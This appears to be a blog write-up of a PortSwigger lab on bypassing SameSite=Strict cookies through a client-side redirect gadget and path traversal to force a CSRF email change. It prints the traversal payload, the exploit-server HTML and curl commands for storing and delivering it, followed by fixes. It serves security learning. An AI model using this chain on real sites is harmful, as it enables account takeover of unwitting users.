---
layout: post
title: "CSRF: SameSite Strict Bypass via Client-Side Redirect"
date: 2027-07-01 09:00:00 -0500
categories: [Web Security, CSRF]
tags: [csrf, samesite, samesite-strict, client-side-redirect, path-traversal, portswigger, cwe-352]
---

## Overview

This PortSwigger lab demonstrates that `SameSite=Strict` cookies are not an absolute CSRF defence when the application ships a same-origin JavaScript redirect gadget whose target is user-controlled. A two-hop navigation chain — cross-site to the gadget, then same-site from the gadget to the sensitive endpoint — bypasses the Strict restriction entirely.

**CWE:** [CWE-352 — Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)

---

## The Setup

The app issues its session cookie with `SameSite=Strict`:

```
Set-Cookie: session=<token>; Secure; HttpOnly; SameSite=Strict
```

Strict is the strongest cookie policy: the browser refuses to send the cookie on **any** cross-site request, including cross-site GET navigations. The change-email endpoint (`POST /my-account/change-email`) has no [CSRF](https://cwe.mitre.org/data/definitions/352.html) token.

However, two weaknesses combine:

1. **The endpoint also accepts `GET`** — `GET /my-account/change-email?email=x&submit=1` returns a `302` redirect (action applied).

2. **A same-origin JS redirect gadget exists** at `/post/comment/confirmation`. After a comment is posted, the page loads this script:

```js
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const postId = new URL(window.location).searchParams.get("postId");
        window.location = blogPath + "/" + postId;   // user-controlled, no validation
    }, 3000);
}
```

`postId` is taken directly from the URL query string and concatenated into `window.location`. No allow-list, no integer check, no path validation.

---

## The Technique: Two-Hop SameSite=Strict Bypass

SameSite=Strict blocks cookies on the **first** cross-site hop. It does **not** block cookies on subsequent navigations that originate from within the same origin. A same-origin redirect gadget acts as a bridge:

| Hop | From | To | Cross-site? | Strict cookie sent? |
|-----|------|----|-------------|---------------------|
| 1 | Exploit server | `/post/comment/confirmation?postId=…` | ✅ Yes (cross-site) | ❌ Blocked |
| 2 | `/post/comment/confirmation` (gadget) | `/my-account/change-email?email=…` | ❌ No (same-site) | ✅ Sent |

The first hop just loads the gadget page — no cookie needed. The gadget's JavaScript fires after 3 seconds and navigates within the same origin, carrying the victim's Strict session cookie to the sensitive endpoint.

### Path traversal to reach change-email

`blogPath` is `/post` and the gadget appends `/postId`. By injecting `../` sequences into `postId`, the final path can be made to resolve anywhere on the same origin:

```
postId=1/../../my-account/change-email?email=attacker%40evil.com%26submit=1
```

`/post/` + `1/../../my-account/change-email?…` normalises to `/my-account/change-email?…`.

**Encoding requirements inside `postId`:**
- `@` → `%40` — prevents `@` from being interpreted as a userinfo separator in the URL
- `&` → `%26` — **critical**: a raw `&` terminates the `postId` query parameter at the browser's URL parser before the redirect fires; `submit=1` never reaches the redirect target path

---

## Solution

### 1. Verify the gadget and GET acceptance

```bash
# Test path traversal in the gadget (curl sees the redirect Location header)
curl -sk 'https://TARGET/post/comment/confirmation?postId=1/../../my-account' -D - | grep -i location

# Confirm change-email accepts GET (302 = action applied)
curl -sk -b cookies.txt \
  'https://TARGET/my-account/change-email?email=test%40test.com&submit=1' \
  -o /dev/null -w '%{http_code}\n'
```

`302` on both = bypass is viable.

### 2. Store the exploit on the exploit server

```html
<script>
document.location = "https://TARGET/post/comment/confirmation?postId=1/../../my-account/change-email?email=attacker%40evil.com%26submit=1";
</script>
```

```bash
curl -sk -X POST 'https://<exploit_server>/' \
  --data-urlencode 'responseFile=/exploit' \
  --data-urlencode 'responseHead=HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8' \
  --data-urlencode 'responseBody=<script>document.location="https://TARGET/post/comment/confirmation?postId=1/../../my-account/change-email?email=attacker%40evil.com%26submit=1";</script>' \
  --data-urlencode 'formAction=STORE'
```

### 3. Deliver to victim

```bash
curl -skL 'https://<exploit_server>/deliver-to-victim'
```

### 4. Confirm solved

```bash
curl -sk 'https://TARGET/' | grep -o 'is-solved'
```

`is-solved` — the victim's email was changed.

---

## Why It Worked

The browser's SameSite=Strict policy evaluates same-site-ness at the moment each HTTP request is issued. The policy sees the **origin of the document making the request**, not the origin that initiated the chain:

- **Hop 1** — The exploit server page calls `document.location = "https://TARGET/…"`. The current document is on the exploit server origin → cross-site → **Strict cookie withheld**.
- **Hop 2** — The gadget page (on TARGET) calls `window.location = "/my-account/change-email?…"`. The current document is on TARGET → same-site → **Strict cookie sent**.

The Strict policy is applied correctly at every step. The vulnerability is that the application provides an unvalidated same-origin redirect, giving an attacker a legitimate same-site launch point for an otherwise-blocked request.

---

## Fix

Three independent defences — each sufficient on its own; apply all three for depth:

**1. Validate `postId` — accept only integers:**

```js
const postId = parseInt(url.searchParams.get("postId"), 10);
if (isNaN(postId)) return;
window.location = blogPath + "/" + postId;   // path traversal impossible
```

**2. Reject GET on state-changing endpoints.** A `document.location` redirect is always a GET. `POST`-only enforcement means a redirect gadget cannot trigger a state change regardless of any cookie policy.

**3. Add a per-request CSRF token.** Even with GET accepted and a redirect gadget present, a required opaque token in the request body or header breaks the chain — the attacker cannot embed the victim's token in the forged URL.

> **Key lesson:** `SameSite=Strict` is defence-in-depth, not a standalone CSRF control. Any same-origin JS file that builds a navigation target from user-supplied URL parameters is a potential CSRF gadget that bypasses the Strict policy from within.
